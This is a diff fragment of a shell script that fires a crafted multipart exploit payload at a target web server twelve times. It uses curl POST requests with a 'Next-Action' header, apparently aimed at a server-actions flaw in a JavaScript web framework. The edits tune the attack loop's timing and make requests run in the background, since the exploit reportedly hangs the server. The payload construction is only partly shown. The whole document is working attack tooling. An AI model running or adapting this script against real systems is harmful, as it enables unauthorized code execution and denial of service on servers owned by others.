@@ -29,7 +29,7 @@ else
     PORT="${2:-3001}"
 fi
 
-SLEEP_TIME=1  # Short delay - exploit executes immediately, server just hangs
+SLEEP_TIME=2  # Brief pause between attacks for visibility
 PAYLOAD_FILE="/tmp/exploit-payload-$$.bin"
 TOTAL_ATTACKS=12
 
@@ -76,12 +76,13 @@ Content-Disposition: form-data; name=\"2\"\r
 sys.stdout.buffer.write(payload.replace('\\\\r\\\\n', '\r\n').encode())
 " > "$PAYLOAD_FILE"
 
-    # Exploit executes immediately but server hangs - use 3s timeout to save time
-    timeout 3 curl -s -X POST "http://${TARGET}:${PORT}" \
+    # Exploit executes immediately but server hangs - run in background and don't wait
+    curl -s -X POST "http://${TARGET}:${PORT}" \
         -H "Next-Action: x" \
         -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
         --data-binary @"$PAYLOAD_FILE" \
-        --connect-timeout 2 > /dev/null 2>&1 || true
+        --connect-timeout 2 -m 3 > /dev/null 2>&1 &
+    sleep 1  # Brief pause to let payload send
 
     rm -f "$PAYLOAD_FILE" 2>/dev/null || true
 }
